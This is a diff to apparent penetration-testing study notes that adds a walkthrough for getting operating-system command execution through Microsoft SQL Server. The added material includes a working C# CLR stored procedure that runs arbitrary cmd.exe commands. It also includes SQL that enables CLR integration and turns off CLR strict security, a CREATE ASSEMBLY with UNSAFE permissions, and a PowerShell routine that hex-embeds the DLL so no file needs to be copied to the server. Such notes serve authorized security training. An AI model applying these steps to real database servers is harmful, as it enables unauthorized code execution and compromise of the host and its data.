@@ -5343,7 +5343,7 @@ With sysadmin role membership, it's possible to obtain code execution on the Win
 
 2. **sp_OACreate** stored procedure.
 
-## 
+### xp_cmdshell
 
 **xp_cmdshell** has been disabled by default since Microsoft SQL 2005.
 
@@ -5408,9 +5408,11 @@ namespace SQL
 }
 ```
 
-Uses the sp_OACreate and sp_OAMethod stored procedures to create and execute a new stored procedure based on Object Linking and Embedding (OLE).
+### sp_OACreate
 
-With this technique, we can instantiate the Windows Script Host and use the run method.
+Uses the **sp_OACreate** and **sp_OAMethod** stored procedures to create and execute a new stored procedure based on Object Linking and Embedding (OLE).
+
+Instantiate the **Windows Script Host** and use the **run** method.
 
 sp_OACreate procedure takes 2 arguments.
 
@@ -5430,7 +5432,7 @@ sp_OAMethod accepts the name of the procedure to execute (@myshell), the method 
 
 It is not possible to obtain the results from the executed command because of the local scope of the @myshell variable.
 
-Ensure that the "OLE Automation Procedures" setting is enabled. Although it is disabled by default, we can change this setting using the sp_configure procedure.
+Ensure that the "**OLE Automation Procedures**" setting is enabled. Although it is disabled by default, we can change this setting using the sp_configure procedure.
 
 ```csharp
 using System;
@@ -5495,6 +5497,28 @@ If a database has the TRUSTWORTHY property set, it's possible to use the **CREAT
 
 Create a managed DLL by creating a new "Class Library (.NET Framework)" project.
 
+Write code that starts a command prompt and executes the command given inside the **execCommand** argument.
+
+The **Process** class is used to start a process while allowing us to supply arguments through the **StartInfo** property.
+
+Use the **FileName** and **Arguments** properties of **StartInfo** to specify "`cmd.exe`" and the command to execute respectively.
+
+Set **UseShellExecute** to "false" to ensure that the command prompt is created directly from `cmd.exe`.
+
+Set **RedirectStandardOutput** to "true" so the output from the command prompt does not get printed to the console, but stored in a pipe instead.
+
+Calling the **Start** method creates the process and executes the command supplied in the execCommand argument.
+
+Retrieve any output generated as a result of the command line input using the **Pipe** property of the **SqlContext** class.
+
+The Pipe property is actually an embedded object instantiated from the **SqlPipe** class, which allows us to record SQL data and return it to the caller. We will use a combination of **SendResultsStart, SendResultsRow, and SendResultsEnd** to start recording, record data, and stop recording respectively.
+
+The object used by these APIs to record data into is of type **SqlDataRecord**.
+
+To send the output from the command prompt to the SQL record, we copy the contents of the Process object StandardOutput property into the record.
+
+This is then returned as part of the result set from the SQL query. Finally, we force the `cmd.exe` process to wait until all actions are completed and subsequently close it.
+
 ```csharp
 using System;
 using Microsoft.SqlServer.Server;
@@ -5506,9 +5530,111 @@ public class StoredProcedures
     [Microsoft.SqlServer.Server.SqlProcedure]
     public static void cmdExec (SqlString execCommand)
     {
-      // TODO
+        Process proc = new Process();
+        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+
+        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
+        SqlContext.Pipe.SendResultsStart(record);
+        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+        SqlContext.Pipe.SendResultsRow(record);
+        SqlContext.Pipe.SendResultsEnd();
+
+        proc.WaitForExit();
+        proc.Close();
     }
 };
+```
+
+Once we have compiled the code into a DLL, we have the assembly that we are going to load into the SQL server and execute.
+
+We can only create a procedure from an assembly if the TRUSTWORTHY property is set.
+
+By default, only the msdb database has this property enabled, but custom databases may use it as well.
+
+Creating a stored procedure from an assembly is not allowed by default. This is controlled through the **CLR Integration** setting, which is disabled by default. => enable it with **sp_configure** and the **clr enabled** option.
+
+Beginning with Microsoft SQL server 2017, there is an additional security mitigation called **CLR strict security**. This mitigation only allows signed assemblies by default. CLR strict security can be disabled through sp_configure with the clr strict security option.
+In summary, we must execute the SQL statements shown in Listing 39 before we start creating the stored procedure from an assembly.
+
+Enable CLR and disable strict security
+
+```
+use msdb
+
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+
+EXEC sp_configure 'clr enabled',1
+RECONFIGURE
+
+EXEC sp_configure 'clr strict security', 0
+RECONFIGURE
+```
+
+Import the assembly with the CREATE ASSEMBLY statement. 
+
+We must supply a custom assembly name, a file location, and specify the PERMISSION_SET to be UNSAFE to allow execution of unsigned .NET code.
+
+Copy the compiled assembly (`cmdExec.dll`) onto dc01 in the `C:\Tools` folder.
+
+On Windows server 2016 and earlier, this technique would also work through a UNC path, but Windows server 2019 does not allow access to SMB shares without authentication.
+
+Next, we can craft the CREATE ASSEMBLY command and import the DLL.
+
+```
+CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;
+```
+
+Once the DLL has been imported, we need to create a procedure based on the cmdExe method with the CREATE PROCEDURE statement.
+
+To do so, we first specify the "CREATE PROCEDURE" statement followed by the name we want to assign to our custom procedure ([dbo].[cmdExec]) and the argument(s) it accepts (@execCommand NVARCHAR (4000)). We then specify the function name in our newly imported assembly ([myAssembly].[StoredProcedures].[cmdExec]), which will be executed when our procedure is invoked.
+CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];
+
+The last half of the SQL query starts with the AS keyword and then specifies the location of the C# method to create a procedure from ([myAssembly].[StoredProcedures].[cmdExec]). This is marked by the EXTERNAL NAME prefix since it is non-native.
+As the final step, we must invoke the newly-created procedure and supply an argument.
+
+```
+EXEC cmdExec 'whoami'
+```
+
+```pwsh
+\\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe
+```
+
+It is not possible to call CREATE ASSEMBLY on the same assembly multiple times without removing the previous one. Instead, the DROP ASSEMBLY statement must be used to drop it. In addition, an assembly cannot be dropped if a procedure that requires it has been created. In that case, the **DROP PROCEDURE** statement must be used first.
+
+In our technique to get code execution from a custom assembly, we initially copied the compiled assembly to the hard drive of the SQL server, which is not realistic.
+
+Let's explore a better alternative.
+It is possible to directly embed the assembly in the CREATE ASSEMBLY SQL query. This is done by directly putting a hexadecimal string containing the binary content of the assembly in the FROM clause instead of specifying the file path.
+
+To convert the assembly (cmdExec.dll) into a hexadecimal string
+
+```pwsh
+$assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
+$stringBuilder = New-Object -Type System.Text.StringBuilder 
+
+$fileStream = [IO.File]::OpenRead($assemblyFile)
+while (($byte = $fileStream.ReadByte()) -gt -1) {
+    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
+}
+$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
+```
+
+With the assembly converted to a hexadecimal string, we only have to update the CREATE ASSEMBLY statement
+
+```
+CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;
+```
+
+Before executing the updated C# console application, we have to ensure that our previous work with CREATE ASSEMBLY and CREATE PROCEDURE has not left any procedures or assemblies on the SQL server. If this is the case, we must first remove them with DROP PROCEDURE and DROP ASSEMBLY.
+
+```pwsh;
+\\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe
 ```
 
 # Active Directory Exploitation
